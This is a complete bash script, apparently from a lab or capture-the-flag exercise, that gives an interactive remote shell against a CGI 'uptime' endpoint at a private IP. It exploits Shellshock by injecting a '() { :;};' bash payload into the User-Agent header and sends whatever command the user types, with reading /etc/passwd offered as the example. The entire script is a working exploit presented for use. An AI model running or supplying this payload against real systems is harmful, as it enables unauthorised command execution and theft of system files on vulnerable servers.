#!/bin/bash

echo -e "\033[1;34mCommand Injection Exploit\033[0m"
echo 
echo "built by h4k3rc4N"
sleep 0.2s

target_url="http://10.0.30.121/cgi-bin/uptime"

while true; do
    echo
    echo
    read -p "Enter the command you want to execute (e.g., 'cat /etc/passwd') or type 'exit' to quit: " user_command

    if [ "$user_command" == "exit" ]; then
        echo "Exiting..."
        break
    fi

    payload="() { :;}; echo Content-Type: text/html; echo ; /bin/bash -c '${user_command}'"

    echo -e "\033[1;33mSending exploit with User-Agent header...\033[0m"
    response=$(curl -s -H "User-Agent: ${payload}" "$target_url")

    echo -e "\n\033[1;32mExploit complete. Here is the result of your command:\033[0m"
    echo
    echo
    echo -e "\033[1;36m$response\033[0m"

    sleep 0.5
done
